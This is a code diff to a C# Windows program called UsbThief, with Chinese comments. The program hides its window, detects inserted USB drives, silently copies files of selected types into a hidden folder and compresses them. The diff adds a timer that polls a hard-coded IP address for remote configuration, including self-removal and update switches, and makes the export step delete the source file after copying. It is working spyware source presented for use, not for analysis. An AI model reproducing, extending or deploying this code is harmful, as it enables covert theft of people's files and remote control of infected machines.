@@ -20,9 +20,10 @@ namespace UsbThief
     public partial class Form1 : Form
     {
         #region 声明变量
-        public const int innerVer = 2;
+        public const bool dbg = false;//调试时改为true
+        public const int innerVer = 3;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
-        public bool fc2c = false;
+        public bool fC2C = false;
         public bool inDelay = false;
         public const int WM_DEVICECHANGE = 0x219;//Notifies an application of a change to the hardware configuration of a device or the computer.
         public const int DBT_DEVICEARRIVAL = 0x8000;  //A device or piece of media has been inserted and is now available.
@@ -36,6 +37,7 @@ namespace UsbThief
         public Status sta = Status.none;
         public Config conf = new Config { enable = false };
         public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
+        public System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer() { Interval = 600000 /*30000*//*30秒的调试用*/};
         public enum Status
         {
             none,
@@ -77,6 +79,8 @@ namespace UsbThief
             logger.Info("UsbThief已启动");
             logger.Info("innerVer：" + innerVer);
             mainThreadSynContext = SynchronizationContext.Current;
+            timer.Tick += Timer_Tick;
+            timer.Start();
             notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
             notifyIcon1.ContextMenuStrip.Items[0].Click += Item0_Click;
             notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
@@ -98,25 +102,82 @@ namespace UsbThief
                 logger.Error("无法创建工作区目录：\n" + e);
             }
             HideFiles(workspace);
-            Thread t = new Thread(() =>
+            GetConf();
+            if (conf.enable)
             {
-                try
+                Dictionary<string, string> devices = ReadSta();
+                if (devices != null)
                 {
-                    WebClient client = new WebClient
+                    foreach (var item in devices)
                     {
-                        Encoding = Encoding.UTF8
-                    };
-                    string text = client.DownloadString("http://111.231.202.181/conf.txt");
-                    logger.Info("获取到网络配置：\n" + text);
-                    conf = JsonConvert.DeserializeObject<Config>(text);
+                        if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
+                        {
+                            Thread compT = new Thread(new ParameterizedThreadStart(Compress));
+                            compT.Start(item.Key);
+                        }
+                    }
                 }
-                catch (Exception e)
+            }
+        }
+        #endregion
+        #region 窗口加载
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            logger.Info("窗口已加载");
+            SetVisibleCore(false);
+            logger.Info("窗口已隐藏");
+        }
+        protected override void SetVisibleCore(bool value)
+        {
+            base.SetVisibleCore(value);
+        }
+        #endregion
+        #region 计时器
+        private void Timer_Tick(object sender, EventArgs e)
+        {
+            GetConf();
+        }
+        #endregion
+        #region 获取网络配置
+        private void GetConf()
+        {
+            if ((sta != Status.none && sta != Status.exported) || inDelay)
+            {
+                if (inDelay)
                 {
-                    logger.Error("获取网络配置失败：\n" + e);
+                    logger.Info("当前处于延迟期间，将不会获取网络配置");
                 }
-            });
-            t.Start();
-            t.Join();
+                else
+                {
+                    logger.Info("任务“" + sta.ToString() + "”正在进行，将不会获取网络配置");
+                }
+                return;
+            }
+            try
+            {
+                using (WebClient client = new WebClient
+                {
+                    Encoding = Encoding.UTF8
+                })
+                {
+                    if (dbg)
+                    {
+                        string text = client.DownloadString("http://111.231.202.181/conf_dbg.txt");
+                        logger.Info("获取到网络配置（调试）：\n" + text);
+                        conf = JsonConvert.DeserializeObject<Config>(text);
+                    }
+                    else
+                    {
+                        string text = client.DownloadString("http://111.231.202.181/conf.txt");
+                        logger.Info("获取到网络配置：\n" + text);
+                        conf = JsonConvert.DeserializeObject<Config>(text);
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                logger.Error("获取网络配置失败：\n" + e);
+            }
             if (conf.suicide == true)
             {
                 try
@@ -143,37 +204,8 @@ namespace UsbThief
                     logger.Error("更新失败：\n" + e);
                 }
             }
-            if (conf.enable)
-            {
-                Dictionary<string, string> devices = ReadSta();
-                if (devices != null)
-                {
-                    foreach (var item in devices)
-                    {
-                        if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
-                        {
-                            Thread compT = new Thread(new ParameterizedThreadStart(Compress));
-                            compT.Start(item.Key);
-                        }
-                    }
-                }
-            }
-            else
-            {
+            if (!conf.enable)
                 logger.Info("部分功能已关闭");
-            }
-        }
-        #endregion
-        #region 窗口加载
-        private void Form1_Load(object sender, EventArgs e)
-        {
-            logger.Info("窗口已加载");
-            SetVisibleCore(false);
-            logger.Info("窗口已隐藏");
-        }
-        protected override void SetVisibleCore(bool value)
-        {
-            base.SetVisibleCore(value);
         }
         #endregion
         #region 托盘图标相关
@@ -347,6 +379,8 @@ namespace UsbThief
                                                                         WriteSta(item.Key, Status.exporting);
                                                                         logger.Info("正在导出文件：" + file);
                                                                         File.Copy(file, tar, true);
+                                                                        if (File.Exists(file))
+                                                                            File.Delete(file);
                                                                         WriteSta(item.Key, Status.exported);
                                                                         logger.Info("导出完成：" + tar);
                                                                     }
@@ -359,7 +393,9 @@ namespace UsbThief
                                                                 {
                                                                     WriteSta(item.Key, Status.exporting);
                                                                     logger.Info("正在导出文件：" + file);
-                                                                    File.Copy(file, tar);
+                                                                    File.Copy(file, tar, true);
+                                                                    if (File.Exists(file))
+                                                                        File.Delete(file);
                                                                     WriteSta(item.Key, Status.exported);
                                                                     logger.Info("导出完成：" + tar);
                                                                 }
@@ -637,6 +673,7 @@ namespace UsbThief
         private void Copy2Disk(object obj)
         {
             string[] str = (string[])obj;
+            fC2C = false;
             WriteSta(str[0], Status.copying);
             CopyLoop(str[1], str[2]);
             HideFiles(workspace);
@@ -646,7 +683,6 @@ namespace UsbThief
         {
             try
             {
-                fc2c = false;
                 DirectoryInfo sourceInfo = new DirectoryInfo(sourcePath);
                 if (!Directory.Exists(targetPath))
                     Directory.CreateDirectory(targetPath);
@@ -658,18 +694,22 @@ namespace UsbThief
                         FileInfo fi1 = new FileInfo(fsi.FullName);
                         if (CheckExt(fi1.Extension))
                         {
-                            if (fi1.Length > GetFreeSpace())
-                            {
-                                logger.Info("剩余磁盘空间不足，将不会复制此文件");
-                                continue;
-                            }
                             if (File.Exists(targetFileName))
                             {
                                 FileInfo fi2 = new FileInfo(targetFileName);
                                 if (fi1.LastWriteTime > fi2.LastWriteTime)
                                 {
-                                    fc2c = true;
                                     logger.Info("正在复制文件：" + fsi.FullName);
+                                    string path = workspace + currentDevice.ser;
+                                    string dest = path + ".zip";
+                                    if (File.Exists(dest))
+                                        File.Delete(dest);
+                                    if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
+                                    {
+                                        logger.Info("剩余磁盘空间不足，将不会复制此文件");
+                                        continue;
+                                    }
+                                    fC2C = true;
                                     File.Copy(fsi.FullName, targetFileName, true);
                                 }
                             }
@@ -677,8 +717,17 @@ namespace UsbThief
                             {
                                 if (fi1.Length <= conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
                                 {
-                                    fc2c = true;
                                     logger.Info("正在复制文件：" + fsi.FullName);
+                                    string path = workspace + currentDevice.ser;
+                                    string dest = path + ".zip";
+                                    if (File.Exists(dest))
+                                        File.Delete(dest);
+                                    if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
+                                    {
+                                        logger.Info("剩余磁盘空间不足，将不会复制此文件");
+                                        continue;
+                                    }
+                                    fC2C = true;
                                     File.Copy(fsi.FullName, targetFileName, true);
                                 }
                             }
@@ -698,7 +747,7 @@ namespace UsbThief
         private void CopyDoneCallback(object state)
         {
             logger.Info("复制完成");
-            if (fc2c)
+            if (fC2C)
             {
                 logger.Info("压缩线程启动");
                 Thread compT = new Thread(new ParameterizedThreadStart(Compress));
